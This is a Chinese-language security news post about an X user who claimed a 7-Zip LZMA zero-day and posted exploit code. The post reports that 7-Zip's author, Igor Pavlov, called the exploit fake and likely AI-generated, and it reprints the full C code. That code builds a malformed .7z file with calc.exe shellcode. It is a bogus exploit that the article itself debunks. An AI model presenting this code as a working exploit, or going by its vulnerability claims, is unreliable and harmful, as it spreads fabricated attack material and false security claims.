#  x网友使用大模型生成 7-zip的0day漏洞，7-zip 原作者辟谣0day是假的   
 独眼情报   2024-12-31 04:40  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/KgxDGkACWnQ7oG5wL4LpsziaWcBuamYZW6etZ4LUBS1ETAqnE1tHhaaN6yc8hbrHZLpCClVvLHibbLJoB0xI8vqQ/640?wx_fmt=png&from=appmsg "")  
  
一名名为@NSA_Employee39 的 X 用户披露了开源文件存档软件 7-Zip 中的一个零日漏洞。
经过验证的 X 账户@NSA_Employee39 声称披露了开源文件存档软件 7-Zip 中的零日漏洞。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/KgxDGkACWnQ7oG5wL4LpsziaWcBuamYZWtVXxdicYSKC1cibMtsk05laTaibxn4Zz3wr8gIAx9O2I6zvtdumtAJHibA/640?wx_fmt=png&from=appmsg "")  
  
X 用户宣布它将“在本周内发布 0day 漏洞”，首先是开源软件 7-Zip 中的任意代码执行漏洞。  
  
攻击者可以利用此漏洞，通过诱骗受害者打开特制的 .7z 存档，在受害者系统上执行恶意代码。  
  
用户在Pastebin上发布了此零日漏洞的利用代码。（见文章结尾）  
  
“此漏洞利用了 7-Zip 软件的 LZMA 解码器中的漏洞。它使用精心设计的带有畸形 LZMA 流的 .7z 存档来触发 RC_NORM 函数中的缓冲区溢出条件。通过对齐偏移量和有效载荷，漏洞利用操纵内部缓冲区指针来执行 shellcode，从而导致任意代码执行。” Pastebin 上写道。“当受害者使用易受攻击的 7-Zip 版本（当前版本）打开/提取存档时，漏洞利用就会触发，执行启动 calc.exe 的有效载荷（您可以更改这一点）。 ”  
  
然而，许多专家对这一说法提出了批评，称该漏洞并不奏效，零日漏洞也并不存在。  
>   
> 7zip 的作者 Igor Pavlov 声称该漏洞是伪造的，他解释说 LZMA 解码器中没有任何 RC_NORM 功能。  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/KgxDGkACWnQ7oG5wL4LpsziaWcBuamYZWoibRPSB5gldXnXGHef3Q6t4q9XlboCfbTbfMdJp9gbsmkPicsnS5RTAg/640?wx_fmt=png&from=appmsg "")  
  
“普遍的结论是，来自 Twitter 的这个虚假漏洞代码是由 LLM（AI）生成的。 ” Pavlov写道。  
  
“假”代码中的注释包含如下语句：  
  
此漏洞针对的是 7-Zip 软件的 LZMA 解码器中的漏洞。它使用精心设计的带有畸形 LZMA 流的 .7z 存档来触发 RC_NORM 函数中的缓冲区溢出条件。”  
  
RC_NORM 但LZMA 解码器中没有 这个函数。
相反，7-Zip RC_NORM 在 LZMA 编码器和 PPMD 解码器中包含宏。因此，LZMA 解码代码不会调用 。 漏洞注释中RC_NORM关于的说法 RC_NORM是不正确的。 “  
## 吃瓜网络发布的相关代码  
```

// by @nsa_employee39

// This exploit targets a vulnerability in the LZMA decoder of the 7-Zip software. It uses a crafted .7z archive with a malformed LZMA stream to trigger a buffer overflow condition in the RC_NORM function. By aligning offsets and payloads, the exploit manipulates the internal buffer pointers to execute shellcode which results in arbitrary code execution. When the victim opens/extracts the archive using a vulnerable version (current version) of 7-Zip, the exploit triggers, executing a payload that launches calc.exe (You can change this).

// offsets might need to be adjusted!!!


#include "LzmaEnc.h"
#include "LzmaDec.h"
#include "7z.h"
#include "7zAlloc.h"
#include "Xz.h"
#include "XzEnc.h"
#include "7zFile.h"
#include "7zStream.h"
#include "CpuArch.h"

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

static void WriteUInt32LE(unsigned char* buf, UInt32 value) {
    buf[0] = (Byte)(value & 0xFF);
    buf[1] = (Byte)((value >> 8) & 0xFF);
    buf[2] = (Byte)((value >> 16) & 0xFF);
    buf[3] = (Byte)((value >> 24) & 0xFF);
}

static void WriteUInt64LE(unsigned char* buf, UInt64 value) {
    buf[0] = (Byte)(value & 0xFF);
    buf[1] = (Byte)((value >> 8) & 0xFF);
    buf[2] = (Byte)((value >> 16) & 0xFF);
    buf[3] = (Byte)((value >> 24) & 0xFF);
    buf[4] = (Byte)((value >> 32) & 0xFF);
    buf[5] = (Byte)((value >> 40) & 0xFF);
    buf[6] = (Byte)((value >> 48) & 0xFF);
    buf[7] = (Byte)((value >> 56) & 0xFF);
}

int main() {
    unsigned char shellcode[] = {
        0x55, 0x89, 0xE5, 0x83, 0xEC, 0x08, 0xC7, 0x04, 0x24,
        'c', 'a', 'l', 'c', 0x00, 0xCC, 0xCC, 0xCC, 0x89, 0xEC, 0x5D, 0xC3
    };

    size_t shellcodeSize = sizeof(shellcode);
    UInt32 addressOfSystemOffset = 0x39;
    UInt32 jmpOffset = (UInt32)((unsigned char*)&system - ((unsigned char*)shellcode + addressOfSystemOffset + 4));
    WriteUInt32LE(shellcode + 18, jmpOffset);

    unsigned char malicious_lzma_stream[] = {
        0x5D, 0x00, 0x00, 0x00, 0x01, 0x00,
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
        0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
    };

    unsigned char header[] = {
        '7', 'z', 0xBC, 0xAF, 0x27, 0x1C, 0x00, 0x04, 0x03, 0x5B, 0xA8, 0x6F,
        0x25, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x8F, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
    };

    unsigned char lzma_props[] = { 0x5D, 0x00, 0x00, 0x00, 0x01, 0x00 };

    size_t payloadSize = sizeof(header) + sizeof(lzma_props) + sizeof(malicious_lzma_stream) + sizeof(shellcode);
    unsigned char *payload = (unsigned char *)malloc(payloadSize);

    unsigned char *p = payload;
    memcpy(p, header, sizeof(header)); p += sizeof(header);
    memcpy(p, lzma_props, sizeof(lzma_props)); p += sizeof(lzma_props);
    memcpy(p, malicious_lzma_stream, sizeof(malicious_lzma_stream)); p += sizeof(malicious_lzma_stream);
    memcpy(p, shellcode, sizeof(shellcode));

    FILE *f = fopen("exploit.7z", "wb");
    if (!f) {
        perror("Failed to create exploit.7z");
        return 1;
    }

    fwrite(payload, 1, payloadSize, f);
    fclose(f);

    free(payload);
    return 0;
}


```  
  
  
  
